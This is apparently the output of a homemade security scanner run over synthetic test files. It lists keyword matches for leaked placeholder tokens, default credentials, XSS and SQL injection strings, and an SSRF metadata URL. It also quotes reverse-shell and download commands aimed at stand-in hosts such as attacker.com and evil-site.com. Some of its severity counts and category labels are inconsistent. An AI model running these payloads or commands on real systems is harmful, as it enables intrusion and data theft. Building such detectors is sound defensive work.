Scan report for: /example/secure-scan/data/.DS_Store
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
✅ No matches found.

Scan report for: /example/secure-scan/data/vulnerability_history.json
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
Total Matches: 703
HIGH: 129
MEDIUM: 97
LOW: 0

Line 259 | HIGH | password | "file": "/example/secure-scan/data/urgent_payroll_password.txt",
Line 5568 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5576 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5584 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5592 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5600 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5608 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5616 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5624 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5632 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5640 | UNKNOWN | eval_usage | "content": "\"content\": \"CRITICAL Dangerous eval detected: eval(user_input)\""
Line 5669 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5677 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5685 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5693 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5701 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5709 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5717 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5725 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5733 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5741 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5749 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 5757 | UNKNOWN | powershell | "content": "\"content\": \"ALERT powershell.exe -ExecutionPolicy Bypass\""
Line 6254 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6262 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6270 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6278 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6286 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6294 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6302 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6310 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6318 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6326 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6334 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6342 | UNKNOWN | debug_endpoint | "content": "\"content\": \"WARN Debug endpoint exposed: /debug/config\""
Line 6371 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6379 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6387 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6395 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6403 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6411 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6419 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6427 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6435 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6443 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6451 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6459 | UNKNOWN | ip_address | "content": "\"content\": \"SSRF request to http://169.254.169.254/latest/meta-data\""
Line 6488 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6496 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6504 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6512 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6520 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6528 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6536 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6544 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6552 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6560 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6568 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6576 | UNKNOWN | email | "content": "\"content\": \"INFO Contact admin@test.com immediately\""
Line 6605 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6613 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6621 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6629 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6637 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6645 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6653 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6661 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6669 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6677 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6685 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""
Line 6693 | UNKNOWN | api_endpoint | "content": "\"content\": \"INFO Request made to /api/users/profile\""

Scan report for: /example/secure-scan/data/payload.EXE
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
Total Matches: 1
HIGH: 1
MEDIUM: 0
LOW: 0

Line 0 | HIGH | dangerous_file_type | Dangerous file detected: payload.EXE

Scan report for: /example/secure-scan/data/invoice.pdf.EXE
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
Total Matches: 3
HIGH: 2
MEDIUM: 1
LOW: 0

Line 0 | HIGH | dangerous_file_type | Dangerous file detected: invoice.pdf.EXE
Line 0 | HIGH | double_extension | Suspicious double extension: invoice.pdf.EXE
Line 0 | MEDIUM | suspicious_filename | Suspicious filename: invoice.pdf.EXE

Scan report for: /example/secure-scan/data/urgent_payroll_password.txt
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
Total Matches: 10
HIGH: 2
MEDIUM: 3
LOW: 0

Line 5 | HIGH | xss | XSS payload detected: <script>alert(1)</script>
Line 8 | HIGH | token | JWT token leaked: eyJhbGciOi
Line 0 | MEDIUM | suspicious_filename | Suspicious filename: urgent_payroll_password.txt
Line 1 | MEDIUM | admin | User logged in as admin
Line 6 | MEDIUM | admin | Broken access control: user accessed /admin without permission
Line 2 | UNKNOWN | weak_password | Password found: password123
Line 3 | UNKNOWN | default_credentials | Default credentials detected: admin:admin
Line 4 | UNKNOWN | sql_injection_payload | SQL injection attempt: ' OR '1'='1
Line 7 | UNKNOWN | api_key_assignment | Sensitive data exposed: api_key=12345
Line 9 | UNKNOWN | ip_address | SSRF request to http://169.254.169.254/latest/meta-data

Scan report for: /example/secure-scan/data/sample_log.txt
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
Total Matches: 43
HIGH: 6
MEDIUM: 2
LOW: 0

Line 6 | HIGH | xss | ERROR XSS payload: <script>alert(1)</script>
Line 10 | HIGH | password | admin password is secret
Line 19 | HIGH | password | WARN SQL attack detected: UNION SELECT password FROM users
Line 20 | HIGH | xss | WARN IMG exploit: <img src=x onerror=alert(1)>
Line 44 | HIGH | xss | ERROR XSS payload: <script>alert(1)</script>
Line 50 | HIGH | token | ALERT github_token found in config
Line 34 | MEDIUM | admin | WARN User attempt access to admin_panel
Line 35 | MEDIUM | admin | WARN Unauthorized access to admin_panel
Line 1 | UNKNOWN | ip_address | INFO User login success user=alice ip=10.0.0.5
Line 2 | UNKNOWN | ip_address | WARN Failed password attempt user=bob ip=10.0.0.9
Line 3 | UNKNOWN | sql_injection_payload | ERROR SQL injection attempt detected: ' OR 1=1 --
Line 5 | UNKNOWN | github_token | WARN admin token exposed: ghp_exampletoken
Line 8 | UNKNOWN | email | INFO Contact admin@test.com immediately
Line 9 | UNKNOWN | api_endpoint | INFO Request made to /api/users/profile
Line 11 | UNKNOWN | password_assignment | password=12345
Line 12 | UNKNOWN | weak_password | INFO AWS key found: AKIA1234567890ABCDE
Line 13 | UNKNOWN | weak_password | AWS key leaked: AKIA1234567890ABCDEF
Line 14 | UNKNOWN | ip_address | INFO Suspicious login from 192.168.1.25
Line 15 | UNKNOWN | hardcore_login | INFO username="test_user"
Line 17 | UNKNOWN | github_token | GitHub token leaked: ghp_abcdefghijklmnoprstuvwxyz123
Line 18 | UNKNOWN | sql_injection_payload | WARN Login attempt username=admin' OR 1=1 --
Line 21 | UNKNOWN | sql_injection_payload | WARN BODY exploit: <body onload=alert('xss')>
Line 22 | UNKNOWN | weak_password | WARN Weak_password detected: password123
Line 23 | UNKNOWN | weak_password | WARN Admin login using admin123
Line 24 | UNKNOWN | admin_endpoint | WARN Admin endpoint accessed: /admin/dashboard
Line 25 | UNKNOWN | debug_endpoint | WARN Debug endpoint exposed: /debug/config
Line 27 | UNKNOWN | os_system_usage | WARN Shell execution detection: os.system(cmd)
Line 31 | UNKNOWN | download_activity | WARN wget http://evil-site.com/backdoor.sh
Line 32 | UNKNOWN | reverse_shell | WARN nc -e /bin/sh attacker.com 4444
Line 33 | UNKNOWN | os_system_usage | WARN Shell execution detected: os.system("rm -rf")
Line 36 | UNKNOWN | admin_endpoint | WARN admin_access attempt to /admin/users
Line 37 | UNKNOWN | sql_injection_payload | ERROR XSS payload: javascript:alert('owned')
Line 38 | UNKNOWN | weak_password | ERROR User account using qwerty password
Line 40 | UNKNOWN | default_credentials | ERROR Default credentials detected admin:admin
Line 41 | UNKNOWN | sql_injection_payload | ERROR Possible login bypass attempt: ' OR 1=1 --
Line 42 | UNKNOWN | pickle_loads | ERROR Unsafe deserialization: pickle.loads(user_data)
Line 43 | UNKNOWN | sql_injection_payload | ERROR SQL injection attempt detected: ' OR 1=1 --
Line 45 | UNKNOWN | sql_injection_payload | ERROR sql_injection_payload detected: ' OR 1=1 --
Line 46 | UNKNOWN | eval_usage | CRITICAL Dangerous eval detected: eval(user_input)
Line 47 | UNKNOWN | powershell | ALERT powershell.exe -ExecutionPolicy Bypass
Line 48 | UNKNOWN | download_activity | ALERT curl http://evil-site.com/malware.exe
Line 49 | UNKNOWN | ip_address | ALERT bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
Line 51 | UNKNOWN | powershell | ALERT powershell execution detection

Scan report for: /example/secure-scan/data/reports/.DS_Store
Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
------------------------------------------------------------
✅ No matches found.
